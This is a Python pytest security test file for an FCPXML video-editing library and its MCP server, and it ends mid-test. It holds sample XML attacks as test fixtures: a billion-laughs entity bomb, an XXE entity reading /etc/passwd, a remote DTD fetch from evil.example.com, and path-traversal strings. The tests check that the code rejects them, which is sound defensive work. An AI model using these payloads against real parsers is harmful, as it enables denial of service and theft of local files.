"""
Security tests — input validation, sanitization, and hardening.

Covers:
- XXE (XML External Entity) and entity expansion protection
- MarkerType.from_string injection/abuse resistance
- XML value sanitization (null bytes, control chars, length limits)
- Parser file size limits
- Marker completed-attribute strict validation (completed='0' → incomplete, '1' → completed)
- File path and directory validation (traversal, null bytes, extensions)
- Role string sanitization in writer
- Minidom pretty-print defense-in-depth (defusedxml.minidom)
- JSON depth-limit enforcement against nested payloads
"""

import asyncio
import os
import sys
import types
import xml.etree.ElementTree as ET
from pathlib import Path
from unittest.mock import MagicMock

import pytest
from defusedxml import DTDForbidden, EntitiesForbidden

from fcpxml.export import DaVinciExporter
from fcpxml.models import MarkerType
from fcpxml.parser import _MAX_FILE_SIZE_BYTES, FCPXMLParser
from fcpxml.rough_cut import RoughCutGenerator
from fcpxml.safe_xml import safe_fromstring, safe_parse
from fcpxml.writer import (
    _MAX_MARKER_NAME_LENGTH,
    FCPXMLModifier,
    _sanitize_xml_value,
)

# ---------------------------------------------------------------------------
# Shim the `mcp` package so server.py can be imported without the real SDK
# ---------------------------------------------------------------------------
if "mcp" not in sys.modules or "mcp.server" not in sys.modules:
    mcp = types.ModuleType("mcp")
    mcp_server = types.ModuleType("mcp.server")
    mcp_server_lowlevel = types.ModuleType("mcp.server.lowlevel")
    mcp_server_helper_types = types.ModuleType("mcp.server.lowlevel.helper_types")
    mcp_server_stdio = types.ModuleType("mcp.server.stdio")
    mcp_types = types.ModuleType("mcp.types")

    class _FakeServer:
        def __init__(self, *a, **kw):
            pass
        def call_tool(self): return lambda fn: fn
        def list_tools(self): return lambda fn: fn
        def list_resources(self): return lambda fn: fn
        def read_resource(self): return lambda fn: fn
        def list_prompts(self): return lambda fn: fn
        def get_prompt(self): return lambda fn: fn

    mcp_server.Server = _FakeServer

    class _FakeCtx:
        def __init__(self, *a): pass
        async def __aenter__(self): return (MagicMock(), MagicMock())
        async def __aexit__(self, *a): pass

    mcp_server_stdio.stdio_server = _FakeCtx

    class ReadResourceContents:
        """Stand-in for mcp.server.lowlevel.helper_types.ReadResourceContents.

        Real one arrived in mcp 1.3.0 — see the pin comment in pyproject.toml.
        Without this shim entry `from server import ...` explodes whenever
        test_security.py is collected before any test that imports the real SDK.
        """
        def __init__(self, content, mime_type=None):
            self.content = content
            self.mime_type = mime_type

    mcp_server_helper_types.ReadResourceContents = ReadResourceContents

    class TextContent:
        def __init__(self, *, type: str, text: str):
            self.type = type
            self.text = text

    for name in ("GetPromptResult", "Prompt", "PromptArgument",
                 "PromptMessage", "Resource", "Tool"):
        setattr(mcp_types, name, MagicMock)
    mcp_types.TextContent = TextContent

    sys.modules.setdefault("mcp", mcp)
    sys.modules.setdefault("mcp.server", mcp_server)
    sys.modules.setdefault("mcp.server.lowlevel", mcp_server_lowlevel)
    sys.modules.setdefault(
        "mcp.server.lowlevel.helper_types", mcp_server_helper_types
    )
    sys.modules.setdefault("mcp.server.stdio", mcp_server_stdio)
    sys.modules.setdefault("mcp.types", mcp_types)

import server as server_module  # noqa: E402
from server import (  # noqa: E402
    _validate_directory,
    _validate_filepath,
    _validate_output_path,
    generate_output_path,
)

# ============================================================================
# MarkerType.from_string hardening
# ============================================================================

class TestMarkerTypeInputValidation:

    def test_rejects_null_bytes(self):
        with pytest.raises(ValueError, match="control characters"):
            MarkerType.from_string("todo\x00")

    def test_rejects_control_characters(self):
        with pytest.raises(ValueError, match="control characters"):
            MarkerType.from_string("todo\x01")

    def test_rejects_bell_character(self):
        with pytest.raises(ValueError, match="control characters"):
            MarkerType.from_string("\x07standard")

    def test_rejects_non_string(self):
        with pytest.raises(TypeError, match="Expected str"):
            MarkerType.from_string(42)

    def test_rejects_none(self):
        with pytest.raises(TypeError, match="Expected str"):
            MarkerType.from_string(None)

    def test_rejects_empty_string(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            MarkerType.from_string("")

    def test_rejects_whitespace_only(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            MarkerType.from_string("   ")

    def test_rejects_oversized_string(self):
        with pytest.raises(ValueError, match="maximum length"):
            MarkerType.from_string("a" * 100)

    def test_strips_whitespace_incomplete(self):
        """Leading/trailing whitespace is stripped before matching for incomplete type."""
        assert MarkerType.from_string("  todo  ") == MarkerType.INCOMPLETE

    def test_strips_whitespace_completed(self):
        """Leading/trailing whitespace is stripped before matching for completed."""
        assert MarkerType.from_string("  completed  ") == MarkerType.COMPLETED

    def test_strips_whitespace_chapter(self):
        """Leading/trailing whitespace is stripped before matching for chapter."""
        assert MarkerType.from_string("  chapter  ") == MarkerType.CHAPTER

    def test_allows_tab_in_value(self):
        """Tabs are printable — should pass control char check but fail enum lookup."""
        with pytest.raises(ValueError, match="Invalid marker type"):
            MarkerType.from_string("to\tdo")


# ============================================================================
# XML value sanitization
# ============================================================================

class TestSanitizeXmlValue:

    def test_strips_null_bytes(self):
        assert _sanitize_xml_value("hello\x00world") == "helloworld"

    def test_strips_control_characters(self):
        assert _sanitize_xml_value("line\x01\x02\x03end") == "lineend"

    def test_preserves_tabs_and_newlines(self):
        assert _sanitize_xml_value("line1\nline2\ttab") == "line1\nline2\ttab"

    def test_truncates_at_max_length(self):
        long_str = "A" * 2000
        result = _sanitize_xml_value(long_str, max_length=100)
        assert len(result) == 100

    def test_default_max_length(self):
        long_str = "B" * (_MAX_MARKER_NAME_LENGTH + 500)
        result = _sanitize_xml_value(long_str)
        assert len(result) == _MAX_MARKER_NAME_LENGTH

    def test_non_string_converted(self):
        assert _sanitize_xml_value(42) == "42"

    def test_empty_string_passthrough(self):
        assert _sanitize_xml_value("") == ""

    def test_unicode_preserved(self):
        assert _sanitize_xml_value("日本語マーカー") == "日本語マーカー"


# ============================================================================
# Marker note sanitization in writer
# ============================================================================

class TestMarkerNoteSanitization:

    @pytest.fixture
    def sample_fcpxml(self, tmp_path):
        xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE fcpxml>
<fcpxml version="1.11">
    <resources>
        <format id="r1" frameDuration="1/24s" width="1920" height="1080"/>
        <asset id="r2" name="TestClip" src="test.mov" start="0s" duration="240/24s"/>
    </resources>
    <library>
        <event name="Test">
            <project name="Test">
                <sequence format="r1" duration="240/24s">
                    <spine>
                        <asset-clip ref="r2" offset="0s" name="TestClip"
                                    start="0s" duration="240/24s" format="r1"/>
                    </spine>
                </sequence>
            </project>
        </event>
    </library>
</fcpxml>"""
        p = tmp_path / "sanitize_test.fcpxml"
        p.write_text(xml)
        return str(p)

    def test_null_bytes_stripped_from_marker_name(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        marker = modifier.add_marker("TestClip", "00:00:00:00", "bad\x00name")
        assert "\x00" not in marker.get("value", "")

    def test_control_chars_stripped_from_note(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        marker = modifier.add_marker(
            "TestClip", "00:00:00:00", "test",
            note="has\x01\x02control\x03chars"
        )
        assert "\x01" not in marker.get("note", "")
        assert marker.get("note") == "hascontrolchars"


# ============================================================================
# Parser completed-attribute strict validation
# ============================================================================

class TestCompletedAttributeValidation:

    def _parse_marker_xml(self, completed_value):
        xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<fcpxml version="1.11">
    <resources>
        <format id="r1" frameDuration="1/24s" width="1920" height="1080"/>
        <asset id="r2" name="Clip" src="test.mov" start="0s" duration="240/24s"/>
    </resources>
    <library>
        <event name="Test">
            <project name="Test">
                <sequence format="r1" duration="240/24s">
                    <spine>
                        <asset-clip ref="r2" offset="0s" name="Clip"
                                    start="0s" duration="240/24s" format="r1">
                            <marker start="0s" duration="1/24s" value="Test"
                                    completed="{completed_value}"/>
                        </asset-clip>
                    </spine>
                </sequence>
            </project>
        </event>
    </library>
</fcpxml>"""
        parser = FCPXMLParser()
        project = parser.parse_string(xml)
        return project.primary_timeline.clips[0].markers[0]

    def test_completed_0_is_incomplete(self):
        m = self._parse_marker_xml("0")
        assert m.marker_type == MarkerType.INCOMPLETE

    def test_completed_1_is_completed(self):
        m = self._parse_marker_xml("1")
        assert m.marker_type == MarkerType.COMPLETED

    def test_completed_true_falls_to_standard(self):
        """Non-standard 'true' is rejected — treated as STANDARD."""
        m = self._parse_marker_xml("true")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_yes_falls_to_standard(self):
        """Non-standard 'yes' is rejected — treated as STANDARD."""
        m = self._parse_marker_xml("yes")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_2_falls_to_standard(self):
        """Numeric but non-boolean '2' is rejected."""
        m = self._parse_marker_xml("2")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_empty_falls_to_standard(self):
        m = self._parse_marker_xml("")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_sql_injection_falls_to_standard(self):
        """SQL-like injection in completed attribute is harmless."""
        m = self._parse_marker_xml("1 OR 1=1")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_whitespace_padded_zero_falls_to_standard(self):
        """Whitespace around '0' must not be treated as incomplete — strict matching."""
        m = self._parse_marker_xml(" 0 ")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_whitespace_padded_one_falls_to_standard(self):
        """Whitespace around '1' must not be treated as COMPLETED — strict matching."""
        m = self._parse_marker_xml(" 1 ")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_negative_one_falls_to_standard(self):
        """Negative integers are not valid completed values."""
        m = self._parse_marker_xml("-1")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_case_true_upper_falls_to_standard(self):
        """Case variants of truthy strings are all rejected."""
        m = self._parse_marker_xml("TRUE")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_case_false_falls_to_standard(self):
        """Boolean 'false' string is not a valid completed value."""
        m = self._parse_marker_xml("false")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_whitespace_only_falls_to_standard(self):
        """Pure whitespace completed='   ' must not match any boolean value."""
        m = self._parse_marker_xml("   ")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_tab_padded_zero_falls_to_standard(self):
        """Tab characters around '0' bypass strip() — strict match rejects."""
        m = self._parse_marker_xml("\t0\t")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_tab_padded_one_falls_to_standard(self):
        """Tab characters around '1' bypass strip() — strict match rejects."""
        m = self._parse_marker_xml("\t1\t")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_zero_with_leading_zero_falls_to_standard(self):
        """'00' is not '0' — strict exact-match only."""
        m = self._parse_marker_xml("00")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_unicode_digit_zero_falls_to_standard(self):
        """Unicode fullwidth digit '\uff10' looks like 0 but isn't ASCII '0'."""
        m = self._parse_marker_xml("\uff10")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_unicode_digit_one_falls_to_standard(self):
        """Unicode fullwidth digit '\uff11' looks like 1 but isn't ASCII '1'."""
        m = self._parse_marker_xml("\uff11")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_newline_padded_zero_falls_to_standard(self):
        """Newline around '0' from hand-edited XML must not match incomplete type."""
        m = self._parse_marker_xml("\n0\n")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_newline_padded_one_falls_to_standard(self):
        """Newline around '1' from hand-edited XML must not match COMPLETED."""
        m = self._parse_marker_xml("\n1\n")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_crlf_padded_zero_falls_to_standard(self):
        r"""CRLF (\r\n) around '0' from Windows-edited XML must not match."""
        m = self._parse_marker_xml("\r\n0\r\n")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_mixed_whitespace_one_falls_to_standard(self):
        """Mixed whitespace (space+tab+newline) around '1' must not match."""
        m = self._parse_marker_xml(" \t\n1\n\t ")
        assert m.marker_type == MarkerType.STANDARD


# ============================================================================
# Parser file size limit
# ============================================================================

class TestFileSizeLimit:

    def test_oversized_file_rejected(self, tmp_path):
        """Files exceeding the size limit are rejected before parsing."""
        huge = tmp_path / "huge.fcpxml"
        # Create a file that exceeds the limit via sparse write
        with open(huge, 'wb') as f:
            f.seek(_MAX_FILE_SIZE_BYTES + 1)
            f.write(b'\x00')

        parser = FCPXMLParser()
        with pytest.raises(ValueError, match="exceeds maximum size"):
            parser.parse_file(str(huge))

    def test_normal_file_accepted(self, tmp_path):
        """Normal-sized files parse without size errors."""
        xml = """<?xml version="1.0" encoding="UTF-8"?>
<fcpxml version="1.11">
    <resources>
        <format id="r1" frameDuration="1/24s" width="1920" height="1080"/>
    </resources>
    <library>
        <event name="Test">
            <project name="Test">
                <sequence format="r1" duration="0s">
                    <spine/>
                </sequence>
            </project>
        </event>
    </library>
</fcpxml>"""
        normal = tmp_path / "normal.fcpxml"
        normal.write_text(xml)
        parser = FCPXMLParser()
        project = parser.parse_file(str(normal))
        assert project.name == "Test"


# ============================================================================
# XXE and entity expansion protection (defusedxml)
# ============================================================================

class TestXXEProtection:
    """Verify that defusedxml blocks XML attacks at all entry points."""

    BILLION_LAUGHS = """\
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<fcpxml version="1.11">&lol4;</fcpxml>"""

    XXE_FILE_READ = """\
<?xml version="1.0"?>
<!DOCTYPE fcpxml [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<fcpxml version="1.11">
    <resources>
        <asset id="r1" name="&xxe;" src="test.mov"/>
    </resources>
</fcpxml>"""

    EXTERNAL_DTD_WITH_ENTITY = """\
<?xml version="1.0"?>
<!DOCTYPE fcpxml [
  <!ENTITY % remote SYSTEM "http://evil.example.com/payload.dtd">
  %remote;
]>
<fcpxml version="1.11"/>"""

    def test_billion_laughs_blocked_fromstring(self):
        """Entity expansion bomb must be rejected by safe_fromstring."""
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            safe_fromstring(self.BILLION_LAUGHS)

    def test_xxe_file_read_blocked_fromstring(self):
        """External entity file read must be rejected by safe_fromstring."""
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            safe_fromstring(self.XXE_FILE_READ)

    def test_external_dtd_entity_blocked_fromstring(self):
        """Remote DTD parameter entity must be rejected by safe_fromstring."""
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            safe_fromstring(self.EXTERNAL_DTD_WITH_ENTITY)

    def test_billion_laughs_blocked_parse(self, tmp_path):
        """Entity expansion bomb must be rejected by safe_parse."""
        p = tmp_path / "bomb.fcpxml"
        p.write_text(self.BILLION_LAUGHS)
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            safe_parse(str(p))

    def test_xxe_file_read_blocked_parse(self, tmp_path):
        """External entity file read must be rejected by safe_parse."""
        p = tmp_path / "xxe.fcpxml"
        p.write_text(self.XXE_FILE_READ)
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            safe_parse(str(p))

    def test_external_dtd_entity_blocked_parse(self, tmp_path):
        """Remote DTD parameter entity must be rejected by safe_parse."""
        p = tmp_path / "dtd.fcpxml"
        p.write_text(self.EXTERNAL_DTD_WITH_ENTITY)
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            safe_parse(str(p))

    def test_parser_rejects_billion_laughs(self):
        """FCPXMLParser.parse_string must reject entity expansion attacks."""
        parser = FCPXMLParser()
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            parser.parse_string(self.BILLION_LAUGHS)

    def test_parser_rejects_xxe(self):
        """FCPXMLParser.parse_string must reject XXE attacks."""
        parser = FCPXMLParser()
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            parser.parse_string(self.XXE_FILE_READ)

    def test_parser_file_rejects_billion_laughs(self, tmp_path):
        """FCPXMLParser.parse_file must reject entity expansion from files."""
        p = tmp_path / "bomb.fcpxml"
        p.write_text(self.BILLION_LAUGHS)
        parser = FCPXMLParser()
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            parser.parse_file(str(p))

    def test_clean_xml_still_parses(self):
        """Legitimate FCPXML without DTD/entities must still parse fine."""
        xml = """<?xml version="1.0" encoding="UTF-8"?>
<fcpxml version="1.11">
    <resources>
        <format id="r1" frameDuration="1/24s" width="1920" height="1080"/>
    </resources>
    <library>
        <event name="Test">
            <project name="Safe">
                <sequence format="r1" duration="0s">
                    <spine/>
                </sequence>
            </project>
        </event>
    </library>
</fcpxml>"""
        parser = FCPXMLParser()
        project = parser.parse_string(xml)
        assert project.name == "Safe"

    def test_modifier_rejects_xxe(self, tmp_path):
        """FCPXMLModifier must reject XXE — it also uses safe_parse internally."""
        p = tmp_path / "xxe_mod.fcpxml"
        p.write_text(self.XXE_FILE_READ)
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            FCPXMLModifier(str(p))

    def test_modifier_rejects_billion_laughs(self, tmp_path):
        """FCPXMLModifier must reject entity expansion bombs."""
        p = tmp_path / "bomb_mod.fcpxml"
        p.write_text(self.BILLION_LAUGHS)
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            FCPXMLModifier(str(p))

    def test_exporter_rejects_xxe(self, tmp_path):
        """DaVinciExporter must reject XXE through safe_parse."""
        p = tmp_path / "xxe_export.fcpxml"
        p.write_text(self.XXE_FILE_READ)
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            DaVinciExporter(str(p))

    def test_rough_cut_rejects_xxe(self, tmp_path):
        """RoughCutGenerator must reject XXE through safe_parse."""
        p = tmp_path / "xxe_rough.fcpxml"
        p.write_text(self.XXE_FILE_READ)
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            RoughCutGenerator(str(p))

    def test_explicit_forbid_flags_active(self):
        """Verify safe_xml._SECURITY_FLAGS block entities and externals.

        forbid_dtd is False because FCPXML legitimately uses <!DOCTYPE fcpxml>.
        """
        from fcpxml.safe_xml import _SECURITY_FLAGS
        assert _SECURITY_FLAGS["forbid_dtd"] is False  # FCPXML needs DOCTYPE
        assert _SECURITY_FLAGS["forbid_entities"] is True
        assert _SECURITY_FLAGS["forbid_external"] is True


# ============================================================================
# File path validation (_validate_filepath)
# ============================================================================

class TestFilePathValidation:

    def test_null_byte_in_filepath_rejected(self, tmp_path):
        with pytest.raises(ValueError, match="null byte"):
            _validate_filepath("test\x00.fcpxml")

    def test_nonexistent_file_raises_fnf(self):
        with pytest.raises(FileNotFoundError):
            _validate_filepath("/nonexistent/path/file.fcpxml", ('.fcpxml',))

    def test_wrong_extension_rejected(self, tmp_path):
        bad = tmp_path / "evil.exe"
        bad.write_text("data")
        with pytest.raises(ValueError, match="Invalid file type"):
            _validate_filepath(str(bad), ('.fcpxml', '.fcpxmld'))

    def test_directory_rejected_as_file(self, tmp_path):
        with pytest.raises(ValueError, match="Not a regular file"):
            _validate_filepath(str(tmp_path), ('.fcpxml',))

    def test_oversized_file_rejected(self, tmp_path):
        big = tmp_path / "big.fcpxml"
        with open(big, 'wb') as f:
            f.seek(101 * 1024 * 1024)
            f.write(b'\x00')
        with pytest.raises(ValueError, match="too large"):
            _validate_filepath(str(big), ('.fcpxml',))

    def test_valid_file_accepted(self, tmp_path):
        ok = tmp_path / "test.fcpxml"
        ok.write_text("<fcpxml/>")
        result = _validate_filepath(str(ok), ('.fcpxml',))
        assert result == str(ok.resolve())

    def test_symlink_traversal_resolved(self, tmp_path):
        """Symlinks are resolved before validation — no bypassing via links."""
        real = tmp_path / "real.fcpxml"
        real.write_text("<fcpxml/>")
        link = tmp_path / "link.fcpxml"
        link.symlink_to(real)
        result = _validate_filepath(str(link), ('.fcpxml',))
        assert result == str(real.resolve())


# ============================================================================
# Output path validation (_validate_output_path)
# ============================================================================

class TestOutputPathValidation:

    def test_null_byte_in_output_rejected(self):
        with pytest.raises(ValueError, match="null byte"):
            _validate_output_path("/tmp/out\x00put.fcpxml")

    def test_missing_parent_dir_rejected(self):
        with pytest.raises(ValueError, match="does not exist"):
            _validate_output_path("/nonexistent/dir/file.fcpxml")

    def test_valid_output_accepted(self, tmp_path):
        result = _validate_output_path(str(tmp_path / "out.fcpxml"))
        assert "out.fcpxml" in result

    def test_anchor_dir_allows_child(self, tmp_path):
        """Output inside anchor_dir is accepted."""
        result = _validate_output_path(
            str(tmp_path / "out.fcpxml"), anchor_dir=str(tmp_path)
        )
        assert "out.fcpxml" in result

    def test_anchor_dir_blocks_escape(self, tmp_path):
        """Output outside anchor_dir is rejected — prevents sandbox escape."""
        safe = tmp_path / "safe"
        safe.mkdir()
        with pytest.raises(ValueError, match="escapes allowed directory"):
            _validate_output_path(
                str(tmp_path / "out.fcpxml"), anchor_dir=str(safe)
            )

    def test_anchor_dir_blocks_traversal(self, tmp_path):
        """Explicit ../ traversal past anchor is caught after resolve."""
        safe = tmp_path / "safe"
        safe.mkdir()
        with pytest.raises(ValueError, match="escapes allowed directory"):
            _validate_output_path(
                str(safe / ".." / "escaped.fcpxml"), anchor_dir=str(safe)
            )

    def test_anchor_dir_allows_nested(self, tmp_path):
        """Deeply nested output under anchor is fine."""
        deep = tmp_path / "a" / "b" / "c"
        deep.mkdir(parents=True)
        result = _validate_output_path(
            str(deep / "out.fcpxml"), anchor_dir=str(tmp_path)
        )
        assert "out.fcpxml" in result

    def test_no_anchor_dir_is_permissive(self, tmp_path):
        """Without anchor_dir, any valid parent is accepted (backward compat)."""
        result = _validate_output_path(str(tmp_path / "anywhere.fcpxml"))
        assert "anywhere.fcpxml" in result

    def test_symlink_escape_blocked(self, tmp_path):
        """Symlink pointing outside anchor_dir is caught after resolve()."""
        safe = tmp_path / "safe"
        safe.mkdir()
        target = tmp_path / "secret.fcpxml"
        link = safe / "link.fcpxml"
        link.symlink_to(target)
        with pytest.raises(ValueError, match="escapes allowed directory"):
            _validate_output_path(str(link), anchor_dir=str(safe))

    def test_double_dot_normalization(self, tmp_path):
        """Path with .. components resolved before anchor check."""
        safe = tmp_path / "a" / "b"
        safe.mkdir(parents=True)
        # a/b/../b/out.fcpxml resolves to a/b/out.fcpxml — inside anchor
        dotted = str(safe / ".." / "b" / "out.fcpxml")
        result = _validate_output_path(dotted, anchor_dir=str(safe))
        assert "out.fcpxml" in result

    def test_anchor_dir_itself_is_valid_parent(self, tmp_path):
        """File directly in anchor_dir (not nested) should be accepted."""
        result = _validate_output_path(
            str(tmp_path / "direct.fcpxml"), anchor_dir=str(tmp_path)
        )
        assert "direct.fcpxml" in result

    def test_null_byte_in_anchor_dir_propagates(self, tmp_path):
        """Null byte in the output path is caught even with anchor_dir set."""
        with pytest.raises(ValueError, match="null byte"):
            _validate_output_path(
                "/tmp/ok\x00.fcpxml", anchor_dir=str(tmp_path)
            )


# ============================================================================
# Directory validation (_validate_directory)
# ============================================================================

class TestDirectoryValidation:

    def test_null_byte_in_directory_rejected(self):
        with pytest.raises(ValueError, match="null byte"):
            _validate_directory("/tmp\x00/evil")

    def test_nonexistent_directory_rejected(self):
        with pytest.raises(ValueError, match="Not a valid directory"):
            _validate_directory("/nonexistent/path/nowhere")

    def test_file_rejected_as_directory(self, tmp_path):
        f = tmp_path / "notadir.txt"
        f.write_text("data")
        with pytest.raises(ValueError, match="Not a valid directory"):
            _validate_directory(str(f))

    def test_valid_directory_accepted(self, tmp_path):
        result = _validate_directory(str(tmp_path))
        assert result == str(tmp_path.resolve())

    def test_symlink_directory_resolved(self, tmp_path):
        """Symlinked directories resolve to real path."""
        real_dir = tmp_path / "real"
        real_dir.mkdir()
        link = tmp_path / "link"
        link.symlink_to(real_dir)
        result = _validate_directory(str(link))
        assert result == str(real_dir.resolve())

    def test_allowed_root_accepts_descendant(self, tmp_path):
        """Subdirectory under allowed_root is accepted."""
        child = tmp_path / "projects"
        child.mkdir()
        result = _validate_directory(str(child), allowed_root=str(tmp_path))
        assert result == str(child.resolve())

    def test_allowed_root_accepts_exact_match(self, tmp_path):
        """Root itself is a valid descendant."""
        result = _validate_directory(str(tmp_path), allowed_root=str(tmp_path))
        assert result == str(tmp_path.resolve())

    def test_allowed_root_blocks_escape(self, tmp_path):
        """Directory outside allowed_root is rejected."""
        safe = tmp_path / "safe"
        safe.mkdir()
        outside = tmp_path / "outside"
        outside.mkdir()
        with pytest.raises(ValueError, match="escapes allowed root"):
            _validate_directory(str(outside), allowed_root=str(safe))

    def test_allowed_root_blocks_traversal(self, tmp_path):
        """../ traversal past allowed_root is caught."""
        safe = tmp_path / "safe"
        safe.mkdir()
        with pytest.raises(ValueError, match="escapes allowed root"):
            _validate_directory(str(safe / ".."), allowed_root=str(safe))


# ============================================================================
# Output suffix injection (generate_output_path)
# ============================================================================

class TestGenerateOutputPathSanitization:

    def test_normal_suffix_preserved(self, tmp_path):
        result = generate_output_path(str(tmp_path / "clip.fcpxml"), "_trimmed")
        assert result.endswith("clip_trimmed.fcpxml")

    def test_path_separator_stripped_from_suffix(self, tmp_path):
        """A suffix containing / cannot inject path components."""
        result = generate_output_path(str(tmp_path / "clip.fcpxml"), "/../../../etc/cron")
        assert "/../" not in result
        assert "etc" in result  # Characters survive but separators don't

    def test_null_byte_stripped_from_suffix(self, tmp_path):
        result = generate_output_path(str(tmp_path / "clip.fcpxml"), "_mod\x00ified")
        assert "\x00" not in result

    def test_empty_suffix_gets_default(self, tmp_path):
        """If sanitization strips everything, fallback to _modified."""
        result = generate_output_path(str(tmp_path / "clip.fcpxml"), "///")
        assert "_modified" in result

    def test_dots_and_hyphens_preserved(self, tmp_path):
        result = generate_output_path(str(tmp_path / "clip.fcpxml"), "_v2.1-final")
        assert "clip_v2.1-final.fcpxml" in result


# ============================================================================
# Role string sanitization in writer
# ============================================================================

class TestRoleSanitization:

    @pytest.fixture
    def sample_fcpxml(self, tmp_path):
        xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE fcpxml>
<fcpxml version="1.11">
    <resources>
        <format id="r1" frameDuration="1/24s" width="1920" height="1080"/>
        <asset id="r2" name="TestClip" src="test.mov" start="0s" duration="240/24s"/>
    </resources>
    <library>
        <event name="Test">
            <project name="Test">
                <sequence format="r1" duration="240/24s">
                    <spine>
                        <asset-clip ref="r2" offset="0s" name="TestClip"
                                    start="0s" duration="240/24s" format="r1"/>
                    </spine>
                </sequence>
            </project>
        </event>
    </library>
</fcpxml>"""
        p = tmp_path / "role_test.fcpxml"
        p.write_text(xml)
        return str(p)

    def test_null_bytes_stripped_from_audio_role(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        clip = modifier.assign_role("TestClip", audio_role="dialogue\x00.evil")
        assert "\x00" not in clip.get("audioRole", "")
        assert clip.get("audioRole") == "dialogue.evil"

    def test_control_chars_stripped_from_video_role(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        clip = modifier.assign_role("TestClip", video_role="video\x01\x02role")
        assert clip.get("videoRole") == "videorole"

    def test_oversized_role_truncated(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        clip = modifier.assign_role("TestClip", audio_role="A" * 500)
        assert len(clip.get("audioRole", "")) == 256

    def test_normal_role_passes_through(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        clip = modifier.assign_role("TestClip", audio_role="dialogue.D-1")
        assert clip.get("audioRole") == "dialogue.D-1"

    def test_unicode_role_preserved(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        clip = modifier.assign_role("TestClip", audio_role="ダイアログ")
        assert clip.get("audioRole") == "ダイアログ"


# ============================================================================
# MINIDOM DEFENSE-IN-DEPTH (v0.6.18)
# ============================================================================

class TestMinidomDefenseInDepth:
    """Verify the pretty-print path uses defusedxml.minidom, not stdlib."""

    def test_safe_parse_string_returns_document(self):
        """safe_parse_string produces a valid minidom Document."""
        from fcpxml.safe_xml import safe_parse_string
        doc = safe_parse_string("<root><child/></root>")
        assert doc.documentElement.tagName == "root"

    def test_safe_parse_string_rejects_xxe(self):
        """safe_parse_string blocks external entity payloads."""
        from fcpxml.safe_xml import safe_parse_string
        xxe_xml = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
            ']>'
            '<root>&xxe;</root>'
        )
        with pytest.raises(Exception):
            safe_parse_string(xxe_xml)

    def test_safe_parse_string_rejects_entity_expansion(self):
        """safe_parse_string blocks billion-laughs style entity bombs."""
        from fcpxml.safe_xml import safe_parse_string
        bomb = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE lolz ['
            '<!ENTITY lol "lol">'
            '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
            ']>'
            '<root>&lol2;</root>'
        )
        with pytest.raises(Exception):
            safe_parse_string(bomb)

    def test_serialize_xml_uses_safe_minidom(self, tmp_path):
        """safe_xml.serialize_xml roundtrips through defusedxml.minidom."""
        import xml.etree.ElementTree as ET  # noqa: I001

        from fcpxml.safe_xml import serialize_xml

        root = ET.Element("fcpxml")
        root.set("version", "1.11")
        ET.SubElement(root, "resources")
        out = str(tmp_path / "out.fcpxml")
        result = serialize_xml(root, out, "<!DOCTYPE fcpxml>")
        assert result == out
        content = open(out).read()
        assert "<fcpxml" in content

    def test_writer_write_fcpxml_uses_safe_minidom(self, tmp_path):
        """writer.write_fcpxml roundtrips through defusedxml.minidom."""
        import xml.etree.ElementTree as ET  # noqa: I001

        from fcpxml.writer import write_fcpxml

        root = ET.Element("fcpxml")
        root.set("version", "1.11")
        ET.SubElement(root, "resources")
        ET.SubElement(root, "library")
        out = str(tmp_path / "out.fcpxml")
